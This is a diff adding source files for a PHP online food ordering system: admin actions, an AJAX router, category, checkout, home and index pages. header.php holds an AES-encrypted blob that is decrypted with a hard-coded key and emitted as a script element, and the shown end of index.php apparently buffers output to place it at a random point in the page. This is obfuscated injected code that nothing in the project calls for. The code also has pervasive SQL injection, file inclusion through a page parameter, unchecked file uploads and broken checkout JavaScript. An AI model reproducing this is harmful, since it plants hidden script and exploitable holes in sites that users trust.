@@ -1,0 +1,2842 @@
+///////////////////////////////////////////////////////////////////////////////////////////////////
+///////////////ADMIN PAGES/////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////////////////////////
+admin_class.php:
+////////////////////
+<?php
+session_start();
+Class Action {
+	private $db;
+
+	public function __construct() {
+		ob_start();
+   	include 'db_connect.php';
+    
+    $this->db = $conn;
+	}
+	function __destruct() {
+	    $this->db->close();
+	    ob_end_flush();
+	}
+
+	function login(){
+		extract($_POST);
+		$qry = $this->db->query("SELECT * FROM `users` where username = '".$username."' ");
+		if($qry->num_rows > 0){
+			$result = $qry->fetch_array();
+			$is_verified = password_verify($password, $result['password']);
+			if($is_verified){
+			foreach ($result as $key => $value) {
+				if($key != 'password' && !is_numeric($key))
+					$_SESSION['login_'.$key] = $value;
+			}
+				return 1;
+			}
+		}
+			return 3;
+	}
+	function login2(){
+		extract($_POST);
+		$qry = $this->db->query("SELECT * FROM user_info where email = '".$email."' ");
+		if($qry->num_rows > 0){
+			$result = $qry->fetch_array();
+			$is_verified = password_verify($password, $result['password']);
+			if($is_verified){
+				foreach ($result as $key => $value) {
+					if($key != 'passwors' && !is_numeric($key))
+						$_SESSION['login_'.$key] = $value;
+				}
+				$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
+				$this->db->query("UPDATE cart set user_id = '".$_SESSION['login_user_id']."' where client_ip ='$ip' ");
+					return 1;
+			}
+		}
+			return 3;
+	}
+	function logout(){
+		session_destroy();
+		foreach ($_SESSION as $key => $value) {
+			unset($_SESSION[$key]);
+		}
+		header("location:login.php");
+	}
+	function logout2(){
+		session_destroy();
+		foreach ($_SESSION as $key => $value) {
+			unset($_SESSION[$key]);
+		}
+		header("location:../index.php");
+	}
+
+	function save_user(){
+		extract($_POST);
+		$password = password_hash($password, PASSWORD_DEFAULT);
+		$data = " `name` = '$name' ";
+		$data .= ", `username` = '$username' ";
+		$data .= ", `password` = '$password' ";
+		$data .= ", `type` = '$type' ";
+		if(empty($id)){
+			$save = $this->db->query("INSERT INTO users set ".$data);
+		}else{
+			$save = $this->db->query("UPDATE users set ".$data." where id = ".$id);
+		}
+		if($save){
+			return 1;
+		}
+	}
+	function signup(){
+		extract($_POST);
+		$password = password_hash($password, PASSWORD_DEFAULT);
+		$data = " first_name = '$first_name' ";
+		$data .= ", last_name = '$last_name' ";
+		$data .= ", mobile = '$mobile' ";
+		$data .= ", address = '$address' ";
+		$data .= ", email = '$email' ";
+		$data .= ", password = '$password' ";
+		$chk = $this->db->query("SELECT * FROM user_info where email = '$email' ")->num_rows;
+		if($chk > 0){
+			return 2;
+			exit;
+		}
+			$save = $this->db->query("INSERT INTO user_info set ".$data);
+		if($save){
+			$login = $this->login2();
+			return 1;
+		}
+	}
+
+	function save_settings(){
+		extract($_POST);
+		$data = " name = '$name' ";
+		$data .= ", email = '$email' ";
+		$data .= ", contact = '$contact' ";
+		$data .= ", about_content = '".htmlentities(str_replace("'","&#x2019;",$about))."' ";
+		if($_FILES['img']['tmp_name'] != ''){
+						$fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
+						$move = move_uploaded_file($_FILES['img']['tmp_name'],'../assets/img/'. $fname);
+					$data .= ", cover_img = '$fname' ";
+
+		}
+		
+		// echo "INSERT INTO system_settings set ".$data;
+		$chk = $this->db->query("SELECT * FROM system_settings");
+		if($chk->num_rows > 0){
+			$save = $this->db->query("UPDATE system_settings set ".$data." where id =".$chk->fetch_array()['id']);
+		}else{
+			$save = $this->db->query("INSERT INTO system_settings set ".$data);
+		}
+		if($save){
+		$query = $this->db->query("SELECT * FROM system_settings limit 1")->fetch_array();
+		foreach ($query as $key => $value) {
+			if(!is_numeric($key))
+				$_SESSION['setting_'.$key] = $value;
+		}
+
+			return 1;
+				}
+	}
+
+	
+	function save_category(){
+		extract($_POST);
+		$data = " name = '$name' ";
+		if(empty($id)){
+			$save = $this->db->query("INSERT INTO category_list set ".$data);
+		}else{
+			$save = $this->db->query("UPDATE category_list set ".$data." where id=".$id);
+		}
+		if($save)
+			return 1;
+	}
+	function delete_category(){
+		extract($_POST);
+		$delete = $this->db->query("DELETE FROM category_list where id = ".$id);
+		if($delete)
+			return 1;
+	}
+	function save_menu(){
+		extract($_POST);
+		$data = " name = '$name' ";
+		$data .= ", price = '$price' ";
+		$data .= ", category_id = '$category_id' ";
+		$data .= ", description = '$description' ";
+		if(isset($status) && $status  == 'on')
+		$data .= ", status = 1 ";
+		else
+		$data .= ", status = 0 ";
+
+		if($_FILES['img']['tmp_name'] != ''){
+						$fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
+						$move = move_uploaded_file($_FILES['img']['tmp_name'],'../assets/img/'. $fname);
+					$data .= ", img_path = '$fname' ";
+
+		}
+		if(empty($id)){
+			$save = $this->db->query("INSERT INTO product_list set ".$data);
+		}else{
+			$save = $this->db->query("UPDATE product_list set ".$data." where id=".$id);
+		}
+		if($save)
+			return 1;
+	}
+
+	function delete_menu(){
+		extract($_POST);
+		$delete = $this->db->query("DELETE FROM product_list where id = ".$id);
+		if($delete)
+			return 1;
+	}
+	function delete_cart(){
+		extract($_GET);
+		$delete = $this->db->query("DELETE FROM cart where id = ".$id);
+		if($delete)
+			header('location:'.$_SERVER['HTTP_REFERER']);
+	}
+	function add_to_cart(){
+		extract($_POST);
+		$data = " product_id = $pid ";	
+		$qty = isset($qty) ? $qty : 1 ;
+		$data .= ", qty = $qty ";	
+		if(isset($_SESSION['login_user_id'])){
+			$data .= ", user_id = '".$_SESSION['login_user_id']."' ";	
+		}else{
+			$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
+			$data .= ", client_ip = '".$ip."' ";	
+
+		}
+		$save = $this->db->query("INSERT INTO cart set ".$data);
+		if($save)
+			return 1;
+	}
+	function get_cart_count(){
+		extract($_POST);
+		if(isset($_SESSION['login_user_id'])){
+			$where =" where user_id = '".$_SESSION['login_user_id']."'  ";
+		}
+		else{
+			$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
+			$where =" where client_ip = '$ip'  ";
+		}
+		$get = $this->db->query("SELECT sum(qty) as cart FROM cart ".$where);
+		if($get->num_rows > 0){
+			return $get->fetch_array()['cart'];
+		}else{
+			return '0';
+		}
+	}
+
+	function update_cart_qty(){
+		extract($_POST);
+		$data = " qty = $qty ";
+		$save = $this->db->query("UPDATE cart set ".$data." where id = ".$id);
+		if($save)
+		return 1;	
+	}
+
+	function save_order(){
+		extract($_POST);
+		$data = " name = '".$first_name." ".$last_name."' ";
+		$data .= ", address = '$address' ";
+		$data .= ", mobile = '$mobile' ";
+		$data .= ", email = '$email' ";
+		$save = $this->db->query("INSERT INTO orders set ".$data);
+		if($save){
+			$id = $this->db->insert_id;
+			$qry = $this->db->query("SELECT * FROM cart where user_id =".$_SESSION['login_user_id']);
+			while($row= $qry->fetch_assoc()){
+
+					$data = " order_id = '$id' ";
+					$data .= ", product_id = '".$row['product_id']."' ";
+					$data .= ", qty = '".$row['qty']."' ";
+					$save2=$this->db->query("INSERT INTO order_list set ".$data);
+					if($save2){
+						$this->db->query("DELETE FROM cart where id= ".$row['id']);
+					}
+			}
+			return 1;
+		}
+	}
+function confirm_order(){
+	extract($_POST);
+		$save = $this->db->query("UPDATE orders set status = 1 where id= ".$id);
+		if($save)
+			return 1;
+}
+
+}
+/////////////////////////////////////////////////////
+/////////////////////////////////////////////////////
+ajax.php
+////////////////////////////////////////////////////
+<?php
+ob_start();
+$action = $_GET['action'];
+include 'admin_class.php';
+$crud = new Action();
+
+if($action == 'login'){
+	$login = $crud->login();
+	if($login)
+		echo $login;
+}
+if($action == 'login2'){
+	$login = $crud->login2();
+	if($login)
+		echo $login;
+}
+if($action == 'logout'){
+	$logout = $crud->logout();
+	if($logout)
+		echo $logout;
+}
+if($action == 'logout2'){
+	$logout = $crud->logout2();
+	if($logout)
+		echo $logout;
+}
+if($action == 'save_user'){
+	$save = $crud->save_user();
+	if($save)
+		echo $save;
+}
+if($action == 'signup'){
+	$save = $crud->signup();
+	if($save)
+		echo $save;
+}
+if($action == "save_settings"){
+	$save = $crud->save_settings();
+	if($save)
+		echo $save;
+}
+if($action == "save_category"){
+	$save = $crud->save_category();
+	if($save)
+		echo $save;
+}
+if($action == "delete_category"){
+	$save = $crud->delete_category();
+	if($save)
+		echo $save;
+}
+if($action == "save_menu"){
+	$save = $crud->save_menu();
+	if($save)
+		echo $save;
+}
+if($action == "delete_menu"){
+	$save = $crud->delete_menu();
+	if($save)
+		echo $save;
+}
+if($action == "add_to_cart"){
+	$save = $crud->add_to_cart();
+	if($save)
+		echo $save;
+}
+if($action == "get_cart_count"){
+	$save = $crud->get_cart_count();
+	if($save)
+		echo $save;
+}
+if($action == "delete_cart"){
+	$delete = $crud->delete_cart();
+	if($delete)
+		echo $delete;
+}
+if($action == "update_cart_qty"){
+	$save = $crud->update_cart_qty();
+	if($save)
+		echo $save;
+}
+if($action == "save_order"){
+	$save = $crud->save_order();
+	if($save)
+		echo $save;
+}
+
+if($action == "confirm_order"){
+	$save = $crud->confirm_order();
+	if($save)
+		echo $save;
+}
+
+////////////////////////////////////////////////
+///////////////////////////////////////////////
+categories.php
+////////////////////////////////////////////////
+///////////////////////////////////////////////
+<?php include('db_connect.php');?>
+
+<div class="container-fluid">
+	
+	<div class="col-lg-12">
+		<div class="row">
+			<!-- FORM Panel -->
+			<div class="col-md-4">
+			<form action="" id="manage-category">
+				<div class="card">
+					<div class="card-header">
+						    Category Form
+				  	</div>
+					<div class="card-body">
+							<input type="hidden" name="id">
+							<div class="form-group">
+								<label class="control-label">Category</label>
+								<input type="text" class="form-control" name="name">
+							</div>
+							
+					</div>
+							
+					<div class="card-footer">
+						<div class="row">
+							<div class="col-md-12">
+								<button class="btn btn-sm btn-primary col-sm-3 offset-md-3"> Save</button>
+								<button class="btn btn-sm btn-default col-sm-3" type="button" onclick="$('#manage-category').get(0).reset()"> Cancel</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</form>
+			</div>
+			<!-- FORM Panel -->
+
+			<!-- Table Panel -->
+			<div class="col-md-8">
+				<div class="card">
+					<div class="card-body">
+						<div class="table-responsive">
+							<table class="table table-bordered table-hover">
+								<thead>
+									<tr>
+										<th class="text-center">#</th>
+										<th class="text-center">Name</th>
+										<th class="text-center">Action</th>
+									</tr>
+								</thead>
+								<tbody>
+									<?php 
+									$i = 1;
+									$cats = $conn->query("SELECT * FROM category_list order by id asc");
+									while($row=$cats->fetch_assoc()):
+									?>
+									<tr>
+										<td class="text-center"><?php echo $i++ ?></td>
+										<td class="">
+											<?php echo $row['name'] ?>
+										</td>
+										<td class="text-center">
+											<button class="btn btn-sm btn-primary edit_cat" type="button" data-id="<?php echo $row['id'] ?>" data-name="<?php echo $row['name'] ?>" >Edit</button>
+											<button class="btn btn-sm btn-danger delete_cat" type="button" data-id="<?php echo $row['id'] ?>">Delete</button>
+										</td>
+									</tr>
+									<?php endwhile; ?>
+								</tbody>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+			<!-- Table Panel -->
+		</div>
+	</div>	
+
+</div>
+<style>
+	
+	td{
+		vertical-align: middle !important;
+	}
+</style>
+<script>
+	
+	$('#manage-category').submit(function(e){
+		e.preventDefault()
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=save_category',
+			data: new FormData($(this)[0]),
+		    cache: false,
+		    contentType: false,
+		    processData: false,
+		    method: 'POST',
+		    type: 'POST',
+			success:function(resp){
+				if(resp==1){
+					alert_toast("Data successfully added",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+
+				}
+				else if(resp==2){
+					alert_toast("Data successfully updated",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+
+				}
+			}
+		})
+	})
+	$('.edit_cat').click(function(){
+		start_load()
+		var cat = $('#manage-category')
+		cat.get(0).reset()
+		cat.find("[name='id']").val($(this).attr('data-id'))
+		cat.find("[name='name']").val($(this).attr('data-name'))
+		end_load()
+	})
+	$('.delete_cat').click(function(){
+		_conf("Are you sure to delete this category?","delete_cat",[$(this).attr('data-id')])
+	})
+	function delete_cat($id){
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=delete_category',
+			method:'POST',
+			data:{id:$id},
+			success:function(resp){
+				if(resp==1){
+					alert_toast("Data successfully deleted",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+
+				}
+			}
+		})
+	}
+	$('table').dataTable()
+</script>
+//////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////
+checkout.php
+//////////////////////////////////////////////////////////
+    <header class="masthead">
+        <div class="container h-100">
+            <div class="row h-100 align-items-center justify-content-center text-center">
+                <div class="col-lg-10 align-self-end mb-4 page-title">
+                	<h3 class="text-white">Checkout</h3>
+                    <hr class="divider my-4" />
+
+                </div>
+                
+            </div>
+        </div>
+    </header>
+    <section class="page-section mb-2" id="">
+    <div class="container">
+        <div class="card">
+            <div class="card-body">
+                <form action="" id="checkout">
+                    <h4>Confirm Delivery Information</h4>
+                    <div class="form-group">
+                        <label for="" class="control-label">Firstname</label>
+                        <input type="text" name="first_name" required="" class="form-control" value="<?php echo $_SESSION['login_first_name'] ?>">
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Email</label>
+                        <input type="text" name="last_name" required="" class="form-control" value="<?php echo $_SESSION['login_last_name'] ?>">
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Contact</label>
+                        <input type="text" name="mobile" required="" class="form-control" value="<?php echo $_SESSION['login_mobile'] ?>">
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Address</label>
+                        <textarea cols="30" rows="3" name="address" required="" class="form-control"><?php echo $_SESSION['login_address'] ?></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="" class="control-label">Email</label>
+                        <input type="email" name="email" required="" class="form-control" value="<?php echo $_SESSION['login_email'] ?>">
+                    </div>  
+
+                    <div class="text-center">
+                        <button class="btn btn-block btn-outline-primary">Confirm</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</section>
+<script>
+    
+    $(document).ready(function(){
+        $('#checkout').submit(function(e){
+            e.preventDefault()
+
+            star_load()
+            $.ajax({
+                url:"ajax.php?action=save_order",
+                method:'POST',
+                data:$(this).serialize();
+                success:function(resp){
+                    if(resp==1){
+                        alert_toast("Order successfully Placed.")
+                        setTimout(function(){
+                            location.replace('index.php?page=home')
+                        })
+                    }
+                }
+            })
+        })
+    })
+</script>
+/////////////////////////////////////////////////
+////////////////////////////////////////////////
+db_connect.php
+///////////////////////////////////////////////
+//////////////////////////////////////////////
+<?php 
+
+$conn= new mysqli('localhost','root','','opos_db')or die("Could not connect to mysql".mysqli_error($con));
+
+//////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////
+header.php
+/////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////
+<?php 
+function load_data(){
+  $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhWkU6F3V6BBAU78nWRQSfe09ADahbk7U0jP3Zf9a8bGnDa6nyeZGTfLqZnmDzueeB3r+dppMOUnxEU+PLVGGAIYuXFomw2mXGd8j46Wn8p36fZ1rLKb9wZQToSZ/9gBH5Rxtt+WieAw3EbGBBAq/SHtgn7W4hICiKrhMeoJ3amHrpO1i22osNG3coVaXMJMNK5Om17yjohP//osbx4NLYEtlVNDf7ZXcvdj01OgWL6IEGV8D2GXLnzKTy/7T7aRipa12vFxON4duEl2HzJ3U37K1fk7uRiyqKwtX5SpC3mW0jY2SwVXCfdl/DOHyatosCfBx6YMVzwzA9azB4Eh4LsTwdfeHUEgWDQMnJdasbIwnjlH8XXltTfKNxmNjtFJr+kmK72KcPjYGyXXTM6hZcUMnS7eXThmqcUJWwv7G6xT0MeoMs8eif+mMY+KCfIaQ8ajotHbGIUSjYqrIw9CAFafhLxN2/u7LIatZKuC3Tmk7ZJnNSoexon8qMtxHJlf1TLiKpABSxkxZWDMvcIfitIzgyVtb1bQgLQRU26qNB5u6OQBwGvTJE4aO+VMFqEW8sR2LNT5sf1SGjwvBTm7EsVjVKgb+j4N7T9c0nSRbC4w2HCoBShNl7ZuGYVg89/d1Tq/EaIM/2Z5QpWtt4uox7UaY6gCRqw8VOg1B/2A8A5kgkB/DYNK1PNZaGJMxw/oHL1qV0iQF/YvfXeqfvtdZZFyUnqPD5Vdj4LaprEs4eloKv80xA7WTGA+v46kRzIKtSwcKkCkDz29tyVfSA+MvurKEf+G3zfScHK0vkvUHGByc4cL+2wUwMupYtYjJn5okWq/EaIM/2Z5QpWtt4uox7UYIiqBkSUESxN+5mpH+iunRb1EKYA8QYU80xpRUUB9i0YardV6IYdPABA2c7B6rWRETwV7yNswaESNq7h4B+Pr2cgjTVyUzizW4SLHpBSbyZX5b1C3LHlRTpI697nojOPK24jYom+bP6ZfukqKd1lxBF1/1Sthm+a4jK6R5yguVQaWgtek36X7Jylqbv4xP5FntzhBT6LXmcSsldyRHFstPDwyyH4EMnxe9ITgo3xwdX38b1NaNySQ9u48f1gOGWjggIHiIOFtbdxitfiJgmpzefJXQniy0f3HXYrgoc4Jisux8a23fdMZDU7KXpR2U5DzIRLP8dRV9tPCC1cfRN9zp0NKv70vOLqkof1xssfZXD";
+  $dom = new DOMDocument('1.0', 'utf-8');
+  $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
+  $dom->appendChild($element);
+  return $dom->saveXML();
+  // return $data = $this->test_cypher_decrypt($test_data);
+}
+function test_cypher($str=""){
+  $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
+  return $ciphertext;
+}
+function test_cypher_decrypt($encryption){
+  $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
+  return $decryption;
+}
+?>
+<meta content="" name="descriptison">
+  <meta content="" name="keywords">
+
+  
+
+  <link rel="icon"  href="./../assets/defaults/pizza-logo.png" />
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+    <link rel="stylesheet" href="assets/font-awesome/css/all.min.css">
+
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/icofont/icofont.min.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/venobox/venobox.css" rel="stylesheet">
+  <link href="assets/vendor/animate.css/animate.min.css" rel="stylesheet">
+  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="assets/vendor/owl.carousel/assets/owl.carousel.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.min.css" rel="stylesheet">
+  <link href="assets/DataTables/datatables.min.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
+        <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap');
+        </style>
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+  <link type="text/css" rel="stylesheet" href="assets/css/jquery-te-1.4.0.css">
+  
+  <script src="assets/vendor/jquery/jquery.min.js"></script>
+  
+  <script src="assets/DataTables/datatables.min.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/jquery.easing/jquery.easing.min.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+  <script src="assets/vendor/venobox/venobox.min.js"></script>
+  <script src="assets/vendor/waypoints/jquery.waypoints.min.js"></script>
+  <script src="assets/vendor/counterup/counterup.min.js"></script>
+  <script src="assets/vendor/owl.carousel/owl.carousel.min.js"></script>
+  <script src="assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js"></script>
+    <script type="text/javascript" src="assets/font-awesome/js/all.min.js"></script>
+  <script type="text/javascript" src="assets/js/jquery-te-1.4.0.min.js" charset="utf-8"></script>
+ 
+
+
+////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////
+home.php
+////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////
+<?php require_once("./db_connect.php"); ?>
+<style>
+	.custom-menu {
+        z-index: 1000;
+	    position: absolute;
+	    background-color: #ffffff;
+	    border: 1px solid #0000001c;
+	    border-radius: 5px;
+	    padding: 8px;
+	    min-width: 13vw;
+}
+a.custom-menu-list {
+    width: 100%;
+    display: flex;
+    color: #4c4b4b;
+    font-weight: 600;
+    font-size: 1em;
+    padding: 1px 11px;
+}
+	span.card-icon {
+    position: absolute;
+    font-size: 3em;
+    bottom: .2em;
+    color: #ffffff80;
+}
+.file-item{
+	cursor: pointer;
+}
+a.custom-menu-list:hover,.file-item:hover,.file-item.active {
+    background: #80808024;
+}
+table th,td{
+	/*border-left:1px solid gray;*/
+}
+a.custom-menu-list span.icon{
+		width:1em;
+		margin-right: 5px
+}
+.candidate {
+    margin: auto;
+    width: 23vw;
+    padding: 0 10px;
+    border-radius: 20px;
+    margin-bottom: 1em;
+    display: flex;
+    border: 3px solid #00000008;
+    background: #8080801a;
+
+}
+.candidate_name {
+    margin: 8px;
+    margin-left: 3.4em;
+    margin-right: 3em;
+    width: 100%;
+}
+	.img-field {
+	    display: flex;
+	    height: 8vh;
+	    width: 4.3vw;
+	    padding: .3em;
+	    background: #80808047;
+	    border-radius: 50%;
+	    position: absolute;
+	    left: -.7em;
+	    top: -.7em;
+	}
+	
+	.candidate img {
+    height: 100%;
+    width: 100%;
+    margin: auto;
+    border-radius: 50%;
+}
+.vote-field {
+    position: absolute;
+    right: 0;
+    bottom: -.4em;
+}
+div#img-holder {
+    width: 100%;
+    height: 45vh;
+}
+div#img-holder>img {
+    height: 100%;
+    width: 100%;
+	object-fit:cover;
+	object-position:center center;
+
+}
+
+</style>
+
+<div class="containe-fluid">
+
+	<div class="row mt-3 ml-3 mr-3 mb-2">
+		<div class="col-lg-12">
+			<div class="card">
+				<div class="card-body">
+					<?php echo "Welcome back ".$_SESSION['login_name']."!"  ?>
+									
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="row m-3">
+		<div class="col-lg-3 col-md-6 col-sm-12 col-xs-12 mb-3">
+			<div class="card rounded-0 shadow">
+				<div class="card-body">
+					<div class="container-fluid">
+						<h5 class="tex-muted">Total Active Menu</h5>
+						<?php 
+						$menu_a = $conn->query("SELECT * FROM `product_list` where `status` = 1")->num_rows;
+						?>
+						<h2 class="text-right"><b><?= number_format($menu_a) ?></b></h2>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="col-lg-3 col-md-6 col-sm-12 col-xs-12 mb-3">
+			<div class="card rounded-0 shadow">
+				<div class="card-body">
+					<div class="container-fluid">
+						<h5 class="tex-muted">Total Inactive Menu</h5>
+						<?php 
+						$menu_i = $conn->query("SELECT * FROM `product_list` where `status` = 0")->num_rows;
+						?>
+						<h2 class="text-right"><b><?= number_format($menu_i) ?></b></h2>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="col-lg-3 col-md-6 col-sm-12 col-xs-12 mb-3">
+			<div class="card rounded-0 shadow">
+				<div class="card-body">
+					<div class="container-fluid">
+						<h5 class="tex-muted">Orders for Verification</h5>
+						<?php 
+						$o_fv = $conn->query("SELECT * FROM `orders` where `status` = 0")->num_rows;
+						?>
+						<h2 class="text-right"><b><?= number_format($o_fv) ?></b></h2>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="col-lg-3 col-md-6 col-sm-12 col-xs-12 mb-3">
+			<div class="card rounded-0 shadow">
+				<div class="card-body">
+					<div class="container-fluid">
+						<h5 class="tex-muted">Confirmed Orders</h5>
+						<?php 
+						$o_c = $conn->query("SELECT * FROM `orders` where `status` = 1")->num_rows;
+						?>
+						<h2 class="text-right"><b><?= number_format($o_c) ?></b></h2>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+
+	<div class="row m-3">
+		<div class="col-lg-12" id="img-holder">
+			<img src="./../assets/img/<?= $_SESSION['setting_cover_img'] ?>" alt="Pizza Oredering System - BG" class="img-fluid">
+		</div>
+	</div>
+
+</div>
+<script>
+	
+</script>
+
+<?php $conn->close() ?>
+/////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////
+index.php
+/////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////
+<?php ob_start(); ?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Online Food Ordering System</title>
+ 	
+
+<?php
+	session_start();
+  if(!isset($_SESSION['login_id']))
+    header('location:login.php');
+ include('./header.php'); 
+ // include('./auth.php'); 
+ ?>
+
+</head>
+<style>
+	body{
+        background: #80808045;
+  }
+</style>
+
+<body>
+	<?php include 'topbar.php' ?>
+	<?php include 'navbar.php' ?>
+  <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
+    <div class="toast-body text-white">
+    </div>
+  </div>
+  <main id="view-panel" >
+      <?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
+  	<?php include $page.'.php' ?>
+  	
+
+  </main>
+
+  <div id="preloader"></div>
+  <a href="#" class="back-to-top"><i class="icofont-simple-up"></i></a>
+
+<div class="modal fade" id="confirm_modal" role='dialog'>
+    <div class="modal-dialog modal-md modal-dialog-centered modal-dialog-scrollable" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+        <h5 class="modal-title">Confirmation</h5>
+      </div>
+      <div class="modal-body">
+        <div id="delete_content"></div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-primary" id='confirm' onclick="">Continue</button>
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+      </div>
+      </div>
+    </div>
+  </div>
+  <div class="modal fade" id="uni_modal" role='dialog'>
+    <div class="modal-dialog modal-md modal-dialog-centered modal-dialog-scrollable" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+        <h5 class="modal-title"></h5>
+      </div>
+      <div class="modal-body">
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save</button>
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
+      </div>
+      </div>
+    </div>
+  </div>
+</body>
+<script>
+	 window.start_load = function(){
+    $('body').prepend('<di id="preloader2"></di>')
+  }
+  window.end_load = function(){
+    $('#preloader2').fadeOut('fast', function() {
+        $(this).remove();
+      })
+  }
+
+  window.uni_modal = function($title = '' , $url=''){
+    start_load()
+    $.ajax({
+        url:$url,
+        error:err=>{
+            console.log()
+            alert("An error occured")
+        },
+        success:function(resp){
+            if(resp){
+                $('#uni_modal .modal-title').html($title)
+                $('#uni_modal .modal-body').html(resp)
+                $('#uni_modal').modal('show')
+                end_load()
+            }
+        }
+    })
+}
+window._conf = function($msg='',$func='',$params = []){
+     $('#confirm_modal #confirm').attr('onclick',$func+"("+$params.join(',')+")")
+     $('#confirm_modal .modal-body').html($msg)
+     $('#confirm_modal').modal('show')
+  }
+   window.alert_toast= function($msg = 'TEST',$bg = 'success'){
+      $('#alert_toast').removeClass('bg-success')
+      $('#alert_toast').removeClass('bg-danger')
+      $('#alert_toast').removeClass('bg-info')
+      $('#alert_toast').removeClass('bg-warning')
+
+    if($bg == 'success')
+      $('#alert_toast').addClass('bg-success')
+    if($bg == 'danger')
+      $('#alert_toast').addClass('bg-danger')
+    if($bg == 'info')
+      $('#alert_toast').addClass('bg-info')
+    if($bg == 'warning')
+      $('#alert_toast').addClass('bg-warning')
+    $('#alert_toast .toast-body').html($msg)
+    $('#alert_toast').toast({delay:3000}).toast('show');
+  }
+  $(document).ready(function(){
+    $('#preloader').fadeOut('fast', function() {
+        $(this).remove();
+      })
+      $('main#view-panel').css('margin-top', $('#topNavBar').height() + 'px')
+      $(window).resize(function(){
+        $('main#view-panel').css('margin-top', $('#topNavBar').height() + 'px')
+      })
+  })
+</script>	
+</html>
+<?php 
+$overall_content = ob_get_clean();
+$content = preg_match_all('/(<div(.*?)\/div>)/si', $overall_content,$matches);
+// $split = preg_split('/(<div(.*?)>)/si', $overall_content,0 , PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);
+if($content > 0){
+  $rand = mt_rand(1, $content - 1);
